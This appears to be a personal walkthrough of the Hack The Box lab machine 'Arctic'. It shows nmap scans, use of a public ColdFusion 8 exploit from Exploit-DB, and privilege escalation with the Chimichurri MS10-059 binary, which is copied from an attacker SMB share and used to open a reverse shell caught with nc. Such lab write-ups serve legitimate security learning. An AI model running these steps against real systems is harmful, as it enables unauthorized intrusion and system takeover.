**Ping**
```
ping 10.10.10.11
```
![[Pasted image 20240619115236.png]]

Nmap Default Scan
```
nmap 10.10.10.11 -oN dnmap
```
![[Pasted image 20240619120159.png]]

Nmap Service and Script Scan
```
nmap 10.10.10.11 -sC -sV -A -oN snmap
```
![[Pasted image 20240619120452.png]]

Nmap All port Scan
```
nmap -p- --min-rate 10000 10.10.10.11 -oN anmap
```
![[Pasted image 20240619120602.png]]

FMTP Enumeration on Port 8500
Moving in /CFIDE
![[Pasted image 20240619121830.png]]

/Administrator looks interesting
![[Pasted image 20240619121747.png]]

Can see the clodfusion version 8
![[Pasted image 20240619121654.png]]

Will search for any public exploits in the internet for the found Coldfusion Version
![[Pasted image 20240619122019.png]]
Found one from Exploit-DB https://www.exploit-db.com/exploits/50057

I have saved the python exploit code in my machine in a file named exp.py
![[Pasted image 20240619122131.png]]

Have to change a small part in the code
![[Pasted image 20240619122415.png]]
Set the lhost, lport, rhost and rport accordingly.

Run the Script
```
python3 exp.py
```
![[Pasted image 20240619122234.png]]
![[Pasted image 20240619122259.png]]
![[Pasted image 20240619122217.png]]
Got it....!

**Got user.txt**
![[Pasted image 20240619123555.png]]

Will jump to Privilege Escalation....!



Will Get System Info
![[Pasted image 20240619130347.png]]
Got the vulnerable build, and we know the method to elevate our privilege.

As we already done this type of PE in Box DEVEL, going to use same exploit **Chimichurri.exe**
https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe
![[Pasted image 20240619130602.png]]
Started smb Share

And copied the binary from our kali
```
copy \\10.10.14.2\kali\Chimichurri.exe
```
![[Pasted image 20240619130646.png]]

Ran the binary according to the usage
```
Chimichurri.exe 10.10.14.2 443
```
![[Pasted image 20240619130733.png]]

Got Reverse shell as Nt/Authority
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240619130824.png]]

**Got root.txt**
![[Pasted image 20240619130929.png]]



Done with Arctic.........:)

